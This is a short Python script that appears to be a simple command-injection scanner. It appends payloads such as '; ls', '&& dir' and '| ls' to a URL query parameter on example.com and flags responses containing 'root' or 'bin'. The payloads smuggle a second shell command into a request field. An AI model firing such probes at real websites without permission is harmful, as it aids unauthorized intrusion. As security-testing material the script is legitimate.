import requests

def test_command_injection(url, parameter):
    payloads = ["; ls", "&& dir", "| ls"]
    vulnerabilities = []

    for payload in payloads:
        test_url = f"{url}?{parameter}={payload}"
        response = requests.get(test_url)
        if "root" in response.text or "bin" in response.text:  # Adjust based on expected output
            vulnerabilities.append(test_url)
    
    return vulnerabilities

if __name__ == "__main__":
    target_url = "http://example.com/search"
    parameter = "query"
    results = test_command_injection(target_url, parameter)
    print(f"Possible command injection vulnerabilities: {results}")
